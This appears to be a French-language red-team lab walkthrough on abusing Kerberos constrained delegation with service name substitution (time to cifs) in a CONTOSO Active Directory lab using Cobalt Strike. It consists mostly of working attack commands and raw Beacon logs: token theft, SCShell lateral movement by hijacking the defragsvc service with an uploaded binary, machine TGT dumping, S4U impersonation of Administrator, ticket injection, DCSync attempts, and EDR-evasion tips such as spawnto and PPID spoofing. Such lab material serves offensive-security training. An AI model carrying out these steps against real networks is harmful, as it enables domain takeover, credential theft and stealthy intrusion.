# Lab — Constrained Delegation avec Service Name Substitution

> L’objectif est d’exploiter la **Constrained Delegation** en utilisant un autre nom de service.

**Principe :** lorsqu’une Constrained Delegation vise un service non-CIFS (par exemple `time/lon-fs-1`), le scénario remplace la classe de service dans la partie non chiffrée du ticket (`time` → `cifs`). Selon ces notes, la cible valide la partie chiffrée et accepte le ticket modifié. Cela permet d’accéder au filesystem même si CIFS n’apparaît pas dans `msDS-AllowedToDelegateTo`.

===

## Énumération

1. Lancer Cobalt Strike et se connecter au team server.
2. Rechercher les cibles de Constrained Delegation et relever la valeur de `msDS-AllowedToDelegateTo` (par exemple `time/lon-fs-1`). Le SPN exact est nécessaire pour l’étape suivante.  

```Beacon-nocolor
ldapsearch (&(samAccountType=805306369)(msDS-AllowedToDelegateTo=*)) --attributes samAccountName,msDS-AllowedToDelegateTo,userAccountControl
```

> OPSEC-🟢SAFE — BOF exécuté dans le thread Beacon, sans child process.

⚠️ Résultat attendu : `lon-ws-1$` avec `msDS-AllowedToDelegateTo: time/lon-fs-1`. Le service est `time`, et non `cifs` : c’est le point étudié dans ce lab.

## Lateral Movement vers lon-ws-1

Objectif : disposer d’un Beacon SYSTEM sur `lon-ws-1` afin d’accéder à la session de logon du compte machine (LUID `0x3e7`) et d’en récupérer le TGT.

1. Rechercher un processus appartenant à `rsteel` (Workstation Admin sur lon-ws-1) :

```cs
ps
// Look for cmd.exe, mmc.exe owned by CONTOSO\rsteel
```

2. Récupérer le token :

```cs
steal_token <rsteel-pid>    // OPSEC-🟢SAFE — no logon event, no child process
getuid                       // confirm CONTOSO\rsteel
```

3. Configurer `spawnto` avant le Jump :

```cs
ak-settings spawnto_x64 C:\Windows\System32\dllhost.exe
// dllhost.exe = COM surrogate — blends with normal system activity
// Standard CS equivalent if ak-settings not loaded:
spawnto x64 %windir%\sysnative\dllhost.exe
```

4. Effectuer un Jump vers lon-ws-1

```cs
jump scshell64 lon-ws-1 smb

rev2self    // drop rsteel token on source beacon after jump succeeds
```

5. Depuis le nouveau Beacon de lon-ws-1, vérifier le contexte SYSTEM :

```cs
getuid
```


## Exploitation

### Étape 1 — Récupérer le TGT du compte machine

Le LUID `0x3e7` désigne la session de logon du compte machine sur un hôte joint au domaine, accessible depuis SYSTEM selon les notes.

```cs
krb_dump /luid:3e7 /service:krbtgt
```

> OPSEC-🟠CAUTION — BOF utilisant l’API Kerberos `LsaCallAuthenticationPackage`, sans lecture directe de LSASS. Un EDR peut observer cet appel API.

> ⚠️ **Vérifié dans le lab (19/04/2026) :** utiliser `/luid:3e7` sans le préfixe `0x`. Kerbeus-BOF rejette `/luid:0x3e7` avec `[x] Invalid luid`.

⚠️ Copier l’intégralité du TGT Base64 pour l’utiliser ensuite avec `krb_s4u`.

> ```cs
> beacon> krb_dump /user:Administrator /service:krbtgt
> ```
> Résultat observé dans le lab (19/04/2026) : le TGT Administrator était en cache sur lon-ws-1 au LUID `0x7940d`. Un accès Domain Admin direct était donc possible sans exploiter la delegation.

> Vérifier le ticket avant de l’utiliser :  

```cs
beacon> krb_describe /ticket:[base64-TGT]    // OPSEC-🟢SAFE — BOF, read-only
```


### Étape 2 — S4U avec Service Name Substitution

Utiliser le TGT machine pour demander un service ticket pour le SPN délégué (`time/lon-fs-1`), puis remplacer la classe de service par `cifs`. Le ticket obtenu est destiné à `cifs/lon-fs-1` avec impersonation d’Administrator.

```Beacon-nocolor
krb_s4u /ticket:[base64-TGT-output-from-krb_dump_3e7] /service:time/lon-fs-1 /altservice:cifs /impersonateuser:Administrator
```

> OPSEC-🟢SAFE — `krb_s4u` est un BOF exécuté dans le thread Beacon, sans child process ni écriture sur disque.

⚠️ `/service:time/lon-fs-1` doit correspondre exactement à `msDS-AllowedToDelegateTo`. Adapter la valeur si le SPN cible diffère dans le lab.

⚠️ `/altservice:cifs` modifie la classe de service dans le header non chiffré du ticket. La partie chiffrée signée par le KDC reste inchangée dans ce scénario.

⚠️ `krb_s4u` renvoie un service ticket en Base64. Copier sa valeur complète pour l’étape 3.

---

### Étape 3 — Enregistrer le service ticket sur l’Attacker Desktop

> Exécuter cette commande sur le client Cobalt Strike de l’Attacker Desktop (PowerShell local, **pas** via le Beacon) :

```powershell
[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\cifs-lon-fs-1.kirbi", [Convert]::FromBase64String("[BASE64-SERVICE-TICKET_output_from_KRB_s4u_beacon]"))
```

> Le fichier `.kirbi` reste sur **l’Attacker Desktop** et n’est pas écrit sur la cible. `kerberos_ticket_use` lit le fichier depuis le client CS et l’injecte par le canal C2.

---

### Étape 4 — Injecter le ticket et accéder au partage

De retour dans le Beacon de `lon-ws-1` :

```cs
// make_token is OPTIONAL when beacon is SYSTEM — lab-confirmed (2026-04-19)
// kerberos_ticket_use injects directly into the SYSTEM logon session
// lon-fs-1 sees Administrator authenticating regardless of local session identity

// Option A — skip make_token (OPSEC-🟢SAFE — no Event 4648, lab-confirmed working)

kerberos_ticket_use C:\Users\Attacker\Desktop\cifs-lon-fs-1.kirbi
ls \\lon-fs-1\c$\users

// Option B — with make_token (OPSEC-🟠CAUTION — Event 4648 logged, cleaner session)

make_token CONTOSO\Administrator FakePass!
kerberos_ticket_use C:\Users\Attacker\Desktop\cifs-lon-fs-1.kirbi
ls \\lon-fs-1\c$
```

> **Pourquoi l’option A fonctionne :** le service ticket `cifs/lon-fs-1` injecté est présenté pendant l’authentification réseau. Le serveur distant valide le ticket Kerberos ; le contexte SYSTEM peut le conserver et le présenter dans ce lab.

⚠️ Si `ls \\lon-fs-1\c$` renvoie `ACCESS_DENIED` :
- `krb_triage` — vérifier la présence du ticket `cifs/lon-fs-1` dans la session courante.
- Vérifier que le SPN de `krb_s4u` correspond exactement à `msDS-AllowedToDelegateTo` obtenu avec ldapsearch.
- Vérifier l’expiration avec `krb_describe /ticket:[base64]`.


> Commandes et sortie brutes du journal Beacon :  

```
[05/22 08:38:15] beacon> ls \\lon-fs-1\c$\users
[05/22 08:38:15] [*] Tasked beacon to list files in \\lon-fs-1\c$\users
[05/22 08:38:19] [+] host called home, sent: 45 bytes
[05/22 08:38:19] [*] Listing: \\lon-fs-1\c$\users\

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     01/24/2025 14:18:02   Administrator
          dir     05/08/2021 08:34:03   All Users
          dir     01/23/2025 13:47:37   Default
          dir     05/08/2021 08:34:03   Default User
          dir     01/23/2025 13:48:37   Public
 174b     fil     05/08/2021 08:18:31   desktop.ini

[05/22 08:38:52] beacon> ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
[05/22 08:38:52] [*] Updating the spawnto_x64 process to 'C:\Windows\System32\svchost.exe'
[05/22 08:38:52] [*] artifact kit settings:
[05/22 08:38:52] [*]    service     = ''
[05/22 08:38:52] [*]    spawnto_x86 = 'C:\Windows\SysWOW64\rundll32.exe'
[05/22 08:38:52] [*]    spawnto_x64 = 'C:\Windows\System32\svchost.exe'
[05/22 08:39:32] beacon> jump scshell64 lon-fs-1 smb
[05/22 08:39:32] [*] Tasked beacon to jump to lon-fs-1 (windows/beacon_bind_pipe (\\.\pipe\TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337)) via SCShell
[05/22 08:39:34] [*] Tasked beacon to upload \\lon-fs-1\C$\Windows\System32\evil95.exe as \\lon-fs-1\C$\Windows\System32\evil95.exe
[05/22 08:39:34] [*] Running BOF SCShell (scshellbof.x64.o)
[05/22 08:39:34] [*] Tasked beacon to remove \\lon-fs-1\C$\Windows\System32\evil95.exe
[05/22 08:39:36] [+] host called home, sent: 427396 bytes
[05/22 08:40:25] [+] received output:
Trying to connect to lon-fs-1

[05/22 08:40:25] [+] received output:
SC_HANDLE Manager 0x00000222180CC170

[05/22 08:40:25] [+] received output:
Opening defragsvc

[05/22 08:40:25] [+] received output:
SC_HANDLE Service 0x00000222180CBCC0

[05/22 08:40:25] [+] received output:
LPQUERY_SERVICE_CONFIGA need 0x00000142 bytes

[05/22 08:40:25] [+] received output:
Original service binary path "C:\Windows\system32\svchost.exe -k defragsvc"

[05/22 08:40:25] [+] received output:
Service path was changed to "C:\Windows\System32\evil95.exe"

[05/22 08:40:25] [+] received output:
Service was started

[05/22 08:40:25] [+] received output:
Service path was restored to "C:\Windows\system32\svchost.exe -k defragsvc"

[05/22 08:40:25] [+] established link to child beacon: 10.10.120.15
[05/22 08:40:58] beacon> 

```

## Énumération de LON-FS-1

> Commandes et sortie brutes du journal Beacon :  

```
[05/22 08:40:25] [+] established link to parent beacon: 10.10.120.10
[05/22 08:41:50] beacon> getuid
[05/22 08:41:50] [*] Tasked beacon to get userid
[05/22 08:41:52] [+] host called home, sent: 16 bytes
[05/22 08:41:52] [*] You are NT AUTHORITY\SYSTEM (admin)
[05/22 08:41:54] beacon> sleep 5 5
[05/22 08:41:54] [*] Tasked beacon to sleep for 5s (5% jitter) [change made to: Beacon 10.10.121.108@11552]
[05/22 08:41:57] beacon> ps
[05/22 08:41:57] [*] Tasked beacon to list processes
[05/22 08:41:57] [+] host called home, sent: 20 bytes
[05/22 08:41:57] [*] Process List

[*] This Beacon PID:    YELLOW 4836  
 PID   PPID  Name                                   Arch  Session     User
 ---   ----  ----                                   ----  -------     ----
 0     0     [System Process]                                         
 4     0         System                             x64   0           NT AUTHORITY\SYSTEM
 96    4             Registry                       x64   0           NT AUTHORITY\SYSTEM
 372   4             smss.exe                       x64   0           NT AUTHORITY\SYSTEM
 572   556   csrss.exe                                                
 636   556   winlogon.exe                           x64   1           NT AUTHORITY\SYSTEM
 860   636       fontdrvhost.exe                    x64   1           Font Driver Host\UMFD-1
 1064  636       dwm.exe                            x64   1           Window Manager\DWM-1
 3444  636       LogonUI.exe                        x64   1           NT AUTHORITY\SYSTEM
 4836  6908  svchost.exe                            x64   0           NT AUTHORITY\SYSTEM
 4980  2276  MicrosoftEdgeUpdate.exe                x86   0           NT AUTHORITY\SYSTEM

[05/22 08:42:15] beacon> krb_triage
[05/22 08:42:15] [+] Kerbeus TRIAGE by RalfHacker
[05/22 08:42:17] [+] host called home, sent: 13665 bytes
[05/22 08:42:17] [+] received output:

Action: List Kerberos Tickets (All Users)


-----------------------------------------------------------------------------------------------------------
| LUID        | Client | Service | End Time |
-----------------------------------------------------------------------------------------------------------
| 0:0x3e4     | lon-fs-1$ @ CONTOSO.COM                  | krbtgt/CONTOSO.COM                       | 22.05.2026 18:23:44 |
| 0:0x3e4     | lon-fs-1$ @ CONTOSO.COM                  | krbtgt/CONTOSO.COM                       | 22.05.2026 18:23:44 |
| 0:0x3e4     | lon-fs-1$ @ CONTOSO.COM                  | cifs/lon-dc-1.contoso.com                | 22.05.2026 18:23:44 |
| 0:0x140df1  | Administrator @ CONTOSO.COM              | cifs/lon-fs-1                            | 22.05.2026 09:35:36 |
| 0:0x3e7     | lon-fs-1$ @ CONTOSO.COM                  | krbtgt/CONTOSO.COM                       | 22.05.2026 18:23:13 |
| 0:0x3e7     | lon-fs-1$ @ CONTOSO.COM                  | krbtgt/CONTOSO.COM                       | 22.05.2026 18:23:13 |
| 0:0x3e7     | lon-fs-1$ @ CONTOSO.COM                  | cifs/lon-dc-1.contoso.com/contoso.com    | 22.05.2026 18:23:13 |
| 0:0x3e7     | lon-fs-1$ @ CONTOSO.COM                  | LON-FS-1$                                | 22.05.2026 18:23:13 |
| 0:0x3e7     | lon-fs-1$ @ CONTOSO.COM                  | LDAP/lon-dc-1.contoso.com                | 22.05.2026 18:23:13 |
| 0:0x3e7     | lon-fs-1$ @ CONTOSO.COM                  | ldap/lon-dc-1.contoso.com/contoso.com    | 22.05.2026 18:23:13 |


```


## Lateral Movement vers LON-DC-1 (incomplet)

**Étape 1 — Vérifier la présence d’un processus Domain Admin**

```cs
ps
// Look for any process owned by CONTOSO\Administrator or other DA
steal_token <admin-pid>
getuid
ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
jump scshell64 lon-dc-1 smb
```

**Étape 2 — En l’absence de processus DA, récupérer le TGT machine et utiliser S4U vers le DC**

Vérifier d’abord si lon-fs-1 dispose d’une Constrained Delegation vers lon-dc-1 :

```cs
ldapsearch (&(samAccountType=805306369)(msDS-AllowedToDelegateTo=*)) --attributes samAccountName,msDS-AllowedToDelegateTo
```

Si la delegation vers lon-dc-1 est présente, récupérer le TGT machine et demander un ticket CIFS avec impersonation d’Administrator :

```cs
krb_dump /luid:3e7 /service:krbtgt
// Copy base64 TGT blob

krb_s4u /ticket:[BASE64-TGT] /service:cifs/lon-dc-1 /impersonateuser:Administrator
```

Enregistrer et injecter le service ticket depuis l’Attacker Desktop :

```powershell
[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\cifs-lon-dc-1.kirbi", [Convert]::FromBase64String("[BASE64-SERVICE-TICKET]"))
```

```cs
kerberos_ticket_use C:\Users\Attacker\Desktop\cifs-lon-dc-1.kirbi
ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
jump scshell64 lon-dc-1 smb
```

**Étape 3 — Sans configuration de delegation, tester DCSync (droits de réplication requis)**

```cs
dcsync contoso.com CONTOSO\krbtgt
```

**Contrôles OPSEC du nouveau Beacon LON-DC-1 (après connexion)**

```cs
sleep 5 21
ps
ppid <svchost PID owned by SYSTEM>
spawnto x64 C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe
ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
getuid
```

### Résultats observés dans le lab — 22/05/2026

**Résultat de l’étape 1 :** `ps` sur LON-FS-1 ne montrait que des processus SYSTEM, sans session Domain Admin. La méthode `steal_token` n’était pas disponible.

**Résultat de l’étape 2 — Échec S4U2proxy (Kerberos error 13)**

S4U2self a fonctionné (self-ticket Administrator vers `LON-FS-1$`), mais S4U2proxy a renvoyé `[x] Kerberos error : 13` (`KDC_ERR_BADOPTION`). LON-FS-1 ne dispose pas de `msDS-AllowedToDelegateTo` pour `cifs/lon-dc-1` : le KDC rejette donc la requête. Les tickets CIFS du compte machine visibles avec `krb_triage` aux LUID `0x3e7` et `0x3e4` correspondent à des opérations AD normales, pas à des permissions de delegation.

```
[*] Building S4U2proxy request for service: 'cifs/lon-dc-1'
    [x] Kerberos error : 13
```

⚠️ **À retenir :** la présence de `cifs/lon-dc-1` dans `krb_triage` ne prouve pas que S4U2proxy fonctionnera. Ce sont des tickets de service AD ordinaires et non des permissions de delegation. Vérifier la configuration avec `ldapsearch` avant S4U.

**Résultat de l’étape 3 — Échec DCSync (access denied)**

```
ERROR kuhl_m_lsadump_dcsync ; GetNCChanges: 0x000020f7 (8439)
```

`0x20f7 = ERROR_DS_DRA_ACCESS_DENIED` — SYSTEM sur un serveur de fichiers ne dispose pas automatiquement des droits de réplication. DCSync requiert un Domain Admin, un compte du groupe Domain Controllers ou des ACL explicites de réplication sur le domaine.

**Conclusion :** dans ce scénario, LON-FS-1 ne permet pas d’atteindre directement LON-DC-1. La Kill Chain complète utilise un Golden Ticket depuis other-DC-1 après le parcours du domaine Dublin, et non un Lateral Movement direct depuis FS-1.

---

## Cleanup — Restauration  

```cs
beacon> rev2self
beacon> kerberos_ticket_purge    // purge injected ticket from SYSTEM session
```

===

⚠️ Ce lab présente la **Service Name Substitution** appliquée à une Constrained Delegation configurée pour `time/lon-fs-1`, afin d’obtenir un ticket `cifs/lon-fs-1` avec impersonation Domain Admin, sans credentials Administrator en clair.
